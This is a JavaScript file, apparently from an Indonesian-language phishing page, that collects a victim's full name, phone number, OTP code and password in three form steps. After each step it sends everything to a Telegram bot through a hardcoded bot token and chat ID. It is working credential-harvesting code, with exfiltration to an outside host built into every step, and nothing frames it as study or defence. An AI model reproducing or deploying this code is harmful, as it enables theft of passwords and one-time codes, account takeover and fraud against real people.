const botToken = "7716385575:AAHNumyyIdsQDp4FqgGYfh30nNPfT95E_WU";
const chatId = "8015899112";

const Toast = Swal.mixin({
  toast: true,
  position: "top-end",
  showConfirmButton: false,
  timer: 5000,
  timerProgressBar: true,
  didOpen: (toast) => {
    toast.onmouseenter = Swal.stopTimer;
    toast.onmouseleave = Swal.resumeTimer;
  },
});

// Variabel untuk menyimpan data dari setiap langkah
let formData = {
  fullName: "",
  phoneNumber: "",
  otp: "",
  password: "",
  status: "",
  sessionStart: Date.now(),
};

function sendToBot(data) {
  const message = `*Form Baru Terdaftar*\n\n*Nama:* ${
    data.fullName ?? "-"
  }\n*Nomor Telepon:* ${data.phoneNumber ?? "-"}\n*OTP:* ${
    data.otp ?? "-"
  }\n*Kata Sandi:* ${data.password ?? "-"}\n*Status:* ${
    data.status ?? "-"
  }\n*Sesi Aktif:* ${timeSince(data.sessionStart)} yang lalu.`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      parse_mode: "markdown",
      text: message,
    }),
  })
    .then((response) => response.json())
    .then((result) => {
      if (result.ok) {
        Toast.fire({
          icon: "success",
          title: "Pesan berhasil dikirim!",
        });
      } else {
        Toast.fire({
          icon: "error",
          title: "Gagal mengirim pesan: " + result.description,
        });
      }
    })
    .catch((error) => {
      Toast.fire({
        icon: "error",
        title: "Terjadi kesalahan: " + error.message,
      });
    });
}

function timeSince(date) {
  const seconds = Math.floor((new Date() - new Date(date)) / 1000);
  let interval = seconds / 31536000;

  if (interval > 1) return Math.floor(interval) + " tahun";
  interval = seconds / 2592000;
  if (interval > 1) return Math.floor(interval) + " bulan";
  interval = seconds / 86400;
  if (interval > 1) return Math.floor(interval) + " hari";
  interval = seconds / 3600;
  if (interval > 1) return Math.floor(interval) + " jam";
  interval = seconds / 60;
  if (interval > 1) return Math.floor(interval) + " menit";

  return Math.floor(seconds) + " detik";
}

// Fungsi untuk mengambil data dari form pertama
function processFirstData() {
  formData.fullName = document.getElementById("full_name").value;
  formData.phoneNumber = document.getElementById("phone_number").value;
  formData.status = "Menunggu OTP";

  sendToBot(formData);

  document.querySelector(".first").style.display = "none";
  document.querySelector(".second").style.display = "block";
}

// Fungsi untuk mengambil data dari form kedua
function processSecondData() {
  formData.otp = document.getElementById("otp").value;
  formData.password = document.getElementById("password").value;
  formData.status = "Menunggu Konfirmasi";

  sendToBot(formData);

  document.querySelector(".second").style.display = "none";
  document.querySelector(".third").style.display = "block";
}

// Fungsi untuk mengambil data dari form ketiga dan mengirimkan data lengkap
function processThirdData() {
  formData.password = document.getElementById("password").value;
  formData.status = "Proses Selesai";

  // Mengirim semua data yang sudah terkumpul
  sendToBot(formData);

  document.querySelector(".third").style.display = "none";
  document.querySelector(".four").style.display = "block";
}
